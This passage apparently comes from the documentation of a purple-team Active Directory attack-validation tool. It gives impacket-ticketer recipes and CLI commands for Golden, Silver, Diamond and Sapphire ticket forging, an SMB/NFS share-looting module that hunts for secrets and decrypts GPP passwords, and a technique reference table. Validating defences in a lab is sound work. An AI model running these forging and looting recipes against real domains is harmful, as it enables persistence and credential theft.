```

In a chain, the signing key is threaded from an upstream KRBTGT-producing edge (e.g.
DCSYNC) rather than a file: `forge_common.signing_key(ctx)` reads
`ctx.input_caps["aes_key"]` (kind `aes`) or `ctx.input_caps["nt_hash"]` (kind `nt`) first,
and falls back to `config.forge_key` (`--forge-key-file`) only for a standalone run. If
neither is present it returns `(None, None)` and the edge **fails closed** — an operator
key is never substituted for an absent or invalid threaded key.

### GOLDEN-TICKET (class `kerberos_forge`, terminal `authn_success`, non-mutating, verified)

Forges a TGT with the krbtgt key impersonating any principal.

- **Recipe:** `T4 GOLDEN = impacket-ticketer -aesKey/-nthash <krbtgt> -domain-sid <SID> -domain <d> -user-id 500 -groups 512 <user> ; nxc --use-kcache reauth (terminal = forged-ccache login Pwn3d)`
- **Prerequisites:** the **krbtgt key** (`--forge-key-file`). Non-mutating.
- **Run:** `--target` → `reauth_target`. Params: `forged_user` (default `Administrator`), `groups` (default `512` = Domain Admins), `user_id` (default `500`), `domain_sid` (auto-resolved if omitted), `reauth_target`.
  ```bash
  python -m purplesploit.validation.cli run GOLDEN-TICKET \
    --domain <d> --dc-ip <ip> --target <reauth_host> \
    --forge-key-file ./krbtgt.aes.key --forge-key-kind aes
  ```
- **Chain edge:** `pre={S0_user_creds}` → `eff={S_persistence}`.

### SILVER-TICKET (class `kerberos_forge`, terminal `authn_success`, non-mutating, verified)

Forges a service ticket with a **service account's key** (service-scoped, not
domain-wide).

- **Recipe:** `T4 SILVER = impacket-ticketer -nthash/-aesKey <service_key> -domain-sid <SID> -domain <d> -spn cifs/<host> -user-id 500 <user> ; nxc --use-kcache reauth (service-scoped; recipe pinned in-lab)`
- **Prerequisites:** the **service account's key** (`--forge-key-file`). Non-mutating.
- **Run:** `--target` → `service_host`. Params: `service_host`, `forged_user` (default `Administrator`), `user_id` (default `500`), `domain_sid`.
  ```bash
  python -m purplesploit.validation.cli run SILVER-TICKET \
    --domain <d> --dc-ip <ip> --target <service_host> \
    --forge-key-file ./svc.key --forge-key-kind nt
  ```
- **Chain edge:** `pre={S0_user_creds}` → `eff={S_computer_control}`.

### DIAMOND-TICKET (class `kerberos_forge`, terminal `authn_success`, non-mutating, verified)

Requests a real TGT then re-signs it with the krbtgt key (`-request`), editing the PAC
— stealthier than Golden.

- **Recipe:** `T4 DIAMOND = impacket-ticketer -request -user <lowpriv> -password/-hashes -aesKey/-nthash <krbtgt> -domain-sid <SID> -domain <d> -groups 512 <user> ; nxc --use-kcache reauth (recipe pinned in-lab)`
- **Prerequisites:** the **krbtgt key** (`--forge-key-file`) **and** valid low-priv creds (`--user` + password/hash for the `-request` leg). Non-mutating.
- **Run:** `--target` → `reauth_target`. Params: `forged_user` (default `diamond_pwn`), `groups` (default `512`), `user_id` (default `500`), `domain_sid`, `reauth_target`.
  ```bash
  python -m purplesploit.validation.cli run DIAMOND-TICKET \
    --domain <d> --dc-ip <ip> --user <lowpriv> --password <p> --target <reauth_host> \
    --forge-key-file ./krbtgt.aes.key
  ```
- **Chain edge:** `pre={S0_user_creds}` → `eff={S_persistence}`.

### SAPPHIRE-TICKET (class `kerberos_forge`, terminal `authn_success`, non-mutating, verified)

Like Diamond but injects a high-privilege principal's **real PAC** via S4U2self+U2U —
needs both the krbtgt AES key and NT hash.

- **Recipe:** `T4 SAPPHIRE = impacket-ticketer -request -impersonate <DA> -user <lowpriv> -password/-hashes -aesKey <krbtgt_aes> -nthash <krbtgt_nt> -domain-sid <SID> -domain <d> <user> ; nxc --use-kcache reauth (recipe pinned in-lab)`
- **Prerequisites:** the **krbtgt AES key** (`--forge-key-file`, kind `aes`) **and** the **krbtgt NT hash** (`--forge-key-nt-file`), plus low-priv creds for `-request`. Non-mutating.
- **Run:** `--target` → `reauth_target`. Params: `impersonate` (default `Administrator`), `forged_user` (default `sapphire_pwn`), `domain_sid`, `reauth_target`.
  ```bash
  python -m purplesploit.validation.cli run SAPPHIRE-TICKET \
    --domain <d> --dc-ip <ip> --user <lowpriv> --password <p> --target <reauth_host> \
    --forge-key-file ./krbtgt.aes.key --forge-key-nt-file ./krbtgt.nt.hash
  ```
- **Chain edge:** `pre={S0_user_creds}` → `eff={S_persistence}`.

---

## 13. Share discovery & loot

### OPENSHARES-WRITE (class `openshares`, terminal `file_write_readback`, mutating, verified)

Writes a uniquely-named canary file to a writable SMB share, reads it back and
compares its SHA-256, then deletes it and verifies the deletion — proving the share
is writable without leaving an artifact.

- **Recipe:** `#66146 OPENSHARES-WRITE = smbclient //<host>/<share> put canary ; get + sha256 compare ; ROLLBACK rm + readback-absent verify (PROVED srv02/srv03 all+public)`
- **Prerequisites:** domain creds with write to the target share. **Mutating** — writes then deletes a canary; rollback verified by read-back-absent.
- **Run:** `--target` → `share`. Params: `share`, `canary_name` (default a random `vrcheck_<hex>.txt`; must be a bare file name).
  ```bash
  python -m purplesploit.validation.cli run OPENSHARES-WRITE \
    --domain <d> --dc-ip <ip> --user <u> --password <p> --target <share>
  ```
- **Receipt:** `file_write_readback`; `mutation.rollback.verified=true`.

### SHARE-LOOT (class `share_loot`, terminal `share_inventory`, non-mutating, read-only, **unverified**)

The first joint **Windows/Linux** module. Discovers SMB **or** NFS shares across a
host scope, crawls them **read-only** with hard bounds, builds an inventory under
**opaque location IDs**, searches fetched files for secrets with a curated rule pack,
and (on a GPP `cpassword` hit) decrypts a usable credential. **Detection-only and
secret-safe by construction** — recovered values never enter the receipt.

- **Recipe:** `SHARE-LOOT = SMB (impacket listShares+listPath) or NFS (pyNfsClient multi-method export discovery + readdirplus) -- read-only, bounded, opaque IDs + loot search + GPP-cpassword creds`
- **Read-only by construction:** the SMB reader uses only impacket list/read ops; the
  NFS reader uses only `Mount.export`/`mnt` + `NFSv3.readdirplus`/`lookup`/`read`.
  No write/create/remove verb is ever built. A unit test asserts this.

**Transport (`config.share_protocol`):**

- **`smb` (default):** discovery via a single programmatic `SMBConnection.listShares()`
  per host (read-only — no `smbclient -L` shell, no write-probe); crawl via recursive
  `listPath` / bounded `getFile`.
- **`nfs` (NFSv3):** discovery **unions four independent methods** so a single wrong
  source cannot hide an export — (1) programmatic `Mount.export()`, (2) `showmount -e`,
  (3) `nmap --script nfs-showmount`, (4) `rpcinfo` liveness. Every CLI method runs as
  an argv **list** through the injected runner (no shell string); a missing tool
  degrades that one method to `ran=False` and never aborts. The receipt records each
  method's `ran` / `found` / `new`. This satisfies the "don't rely only on showmount"
  directive. Export **paths** are the NFS access-control catalog (the analogue of SMB
  share names) and surface in the receipt under the safe-name policy; file/dir paths
  beneath an export stay opaque.

**Access mode (`config.share_access_mode`):**

- **`crawl` (default):** programmatic client reads, no OS mount, no privilege, portable.
- **`mount` (S1b):** the kernel SMB/NFS client mounts each discovered share **read-only**
  (`ro,nosuid,nodev,noexec`) and the mounted, attacker-controlled tree is crawled with a
  **descriptor-anchored containment walk** (`mount_reader._ContainedDir`): `mnt_id`-pinned
  `openat` traversal (`O_NOFOLLOW` dir fds; `O_PATH` file pins reopened via `/proc/self/fd`)
  so a symlink / `..` / cross-mount inside the share can never escape the mount root; symlink
  and non-regular entries are skipped. Needs `CAP_SYS_ADMIN`; SMB creds go in a `0600` file
  (never argv); a mount failure is a per-share `denied`; if **nothing** can be mounted the
  terminal is `inconclusive:mount_unavailable` (never a false success); teardown always
  unmounts. Use `mount` when the programmatic client can't speak the dialect (SMB3
  encryption, Kerberos-auth mounts, NFSv4, DFS); otherwise `crawl` is the safer default.

**Bounds (all `config`, enforced during traversal; a bound hit → an explicit
`partial` outcome, never silent truncation):** `share_max_shares` (64),
`share_max_depth` (12), `share_max_entries` (50000), `share_max_files` (20000),
`share_crawl_deadline_s` (300, a whole-run wall-clock deadline). Plus cycle/visited
detection.

**Loot search (`config.loot_enabled`, default on):** filename rules
(`id_rsa`/`.ppk`/`.kdbx`/`.pfx`/`unattend.xml`/`web.config`/`.env`/`Groups.xml`/…)
mark fetch-worthy files; content rules (PRIVATE KEY blocks, GPP `cpassword`, AWS keys,
DB connection strings, API/Slack tokens, password assignments) scan the fetched bytes.
Fetch is bounded by `loot_max_fetch_files` (2000), `loot_max_file_bytes` (2 MB),
`loot_max_fetch_bytes_total` (200 MB); binaries skipped; deadline-gated.

**Receipt (`share_inventory`):** `ok=true` when ≥1 readable share/export was crawled.
Carries per-host/per-share outcomes (`listed-ok` / `denied` / `unreachable` /
`malformed` / `truncated` / `not_crawled`), a `coverage` block, the multi-method
`discovery` log, a loot summary (presence **counts** by category + opaque `loc:` hit
IDs), and a `usable_credentials` **presence count only**. `complete` means the edge
*observed access* (so a bounded crawl still yields loot); exhaustive coverage is a
separate dimension (`coverage.complete` + `partial:*` errors).

**Secret handling:** raw host/share/path → opaque `loc:<rand>` map lives **only** in
the operator out-of-band store (`loot_store_dir`, default `<output>/loot-store`,
mode `0600`), never the receipt. Recovered secret values / GPP-decrypted credentials
go to that store and to an in-memory `Capability` — never the receipt. A path is never
a proof-token input.

**Chain edge:** `pre={S0_user_creds}` → `eff={S_looted_creds}`. On a usable-credential
hit, `produced()` emits an in-memory `Capability(S_looted_creds, CAP_PASSWORD, value,
principal)` the engine can thread to a downstream edge (looted cred → pivot). The
credential value is never serialized.

**How to invoke — IMPORTANT.** SHARE-LOOT is **not currently reachable through the
`run`, `chain`, or `pipeline` CLI modes** and is driven through the Python API (how its
live proofs were run):

- `run SHARE-LOOT` returns `{"errors": ["dispatch_error"]}` because `SHARE-LOOT` has
  no entry in `validation/inputs.py::TARGET_PARAM` (the finding binder raises before
  any tool runs). Confirmed empirically.
- `SHARE-LOOT` is also absent from the aranum findings mapper, so `pipeline` never
  maps a finding to it.
- `share_protocol`, `share_access_mode`, the bounds, and the loot caps are **not
  exposed as CLI flags** — the CLI's `build_config` does not set them — so NFS / mount
  / bound tuning is only reachable by constructing a `ValidationConfig` directly.

Python-API invocation (matches the merged live-proof path):

```python
from pathlib import Path
from purplesploit.validation.config import ValidationConfig
from purplesploit.validation.executors import get_executor
from purplesploit.validation.executors.base import (
    ExecutorContext, SubprocessRunner, AuthorizedLabProvider)
from purplesploit.validation.findings import NormalizedFinding

cfg = ValidationConfig(
    domain="north.sevenkingdoms.local", dc_ip="10.0.0.10",
    username="vagrant", password="vagrant",
    share_protocol="nfs",          # or "smb"
    output_dir=Path("./validation-run"),
)
ctx = ExecutorContext(
    config=cfg, runner=SubprocessRunner(cfg.tool_timeout_s),
    authorizer=AuthorizedLabProvider(cfg.authorized),
    output_dir=cfg.output_dir / "receipts",
)
edge = get_executor("SHARE-LOOT")
finding = NormalizedFinding(
    source={}, finding_id="operator-SHARE-LOOT", host="10.0.0.10",
    technique="SHARE-LOOT", technique_class="share_loot",
    entity={"hosts": "10.0.0.10"})
receipt = edge.run(ctx, finding)
```

> **Known limitation (operator-readiness gap).** SHARE-LOOT has no `run`/`chain`/`pipeline`
> CLI path yet — it needs a `validation/inputs.py::TARGET_PARAM` entry, and the CLI's
> `build_config` does not surface `share_protocol` / `share_access_mode` / the bounds / the
> loot caps as flags. Until that is wired, SHARE-LOOT (and SMB/NFS/mount/bound tuning) is
> driven through the Python API above. The field names in the example are the real
> `ValidationConfig` / `ExecutorContext` / `NormalizedFinding` members (verified against
> `config.py` / `base.py` / `findings.py`).

---

## 14. Quick reference

| Technique | Class | Terminal | Mutating | Destructive | Verified | `run --target` → | Chain edge (`pre` → `eff`) |
|-----------|-------|----------|:---:|:---:|:---:|------|------|
| KERBEROAST | kerberoast | authn_success | – | – | yes | `principal` | run/pipeline only |
| ASREP | asrep | authn_success | – | – | yes | `principal` | run/pipeline only |
| TARGETED-KERBEROAST | acl | authn_success | yes | – | yes | `victim` | S0_user_creds → S_acl_cred |
| RBCD | delegation | rbcd_access | yes | – | yes | `delegate_to` | run/pipeline only |
| CONSTRAINED-DELEG-PT | delegation | authn_success | – | – | yes | `target_host` | run/pipeline only |
| UNCONSTRAINED-DELEG | delegation | replication_dump | – | – | **no** | `victim_dc` | run/pipeline only |
| LAPS | laps | authn_success | – | – | **no** | `target_host` | run/pipeline only |
| SHADOW-CREDS | shadow_creds | secret_recovered | yes | – | yes | `account` | run/pipeline only |
| WRITE-DACL | acl | file_write_readback | yes | – | yes | `target` | S0_user_creds → S_acl_control |
| WRITE-OWNER | acl | file_write_readback | yes | – | yes | `target` | S0_user_creds → S_acl_control |
| ADD-MEMBER | acl | file_write_readback | yes | – | yes | `group` | S0_user_creds → S_acl_control |
| FORCE-CHANGE-PASSWORD | acl | authn_success | yes | **yes** | yes | `victim` | S0_user_creds → S_acl_cred |
| GENERIC-ALL | acl | (pivot) | yes | **yes** | yes | `target` | {S0_user_creds,S_acl_control} → {S_acl_cred,S_impersonation_tgt} |
| GPO-ABUSE | acl | file_write_readback | yes | **yes** | **no** | `gpo_guid` | S0_user_creds → S_acl_control |
| ADCS-ESC1 | adcs | cert_issued_and_used | yes | – | yes | `ca_host` | run/pipeline only |
| ESC8 | adcs | cert_issued_and_used | yes | – | **no** | `ca_host` | S0_user_creds → dc_tgt |
| ESC11 | adcs | cert_issued_and_used | yes | – | **no** | `ca_host` | S0_user_creds → dc_tgt |
| CERTIFRIED | adcs | cert_issued_and_used | yes | – | **no** | `ca_host` | S0_user_creds → dc_tgt |
| COERCION | coerce | authn_success | – | – | **no** | `victim_dc` | run/pipeline only |
| NTLM-RELAY | relay | replication_dump / rbcd_access | mode | – | **no** | `relay_target` | run/pipeline only |
| DCSYNC | dcsync | replication_dump | – | – | yes | `dc_host` | {dc_tgt, da_creds} → {krbtgt, S_DA} |
| GOLDEN-TICKET | kerberos_forge | authn_success | – | – | yes | `reauth_target` | S0_user_creds → S_persistence |
| SILVER-TICKET | kerberos_forge | authn_success | – | – | yes | `service_host` | S0_user_creds → S_computer_control |
| DIAMOND-TICKET | kerberos_forge | authn_success | – | – | yes | `reauth_target` | S0_user_creds → S_persistence |
| SAPPHIRE-TICKET | kerberos_forge | authn_success | – | – | yes | `reauth_target` | S0_user_creds → S_persistence |
| OPENSHARES-WRITE | openshares | file_write_readback | yes | – | yes | `share` | run/pipeline only |
| SHARE-LOOT | share_loot | share_inventory | – | – | **no** | Python API only (see §13) | S0_user_creds → S_looted_creds |

**Verified = no** means recipe-known but not lab-proven: the technique ships honest,
with unverified tool-output markers, and reports not-proved / inconclusive rather than
inventing a result. **Run/pipeline only** edges lack capability-state metadata and do
not participate in a composed `chain`.
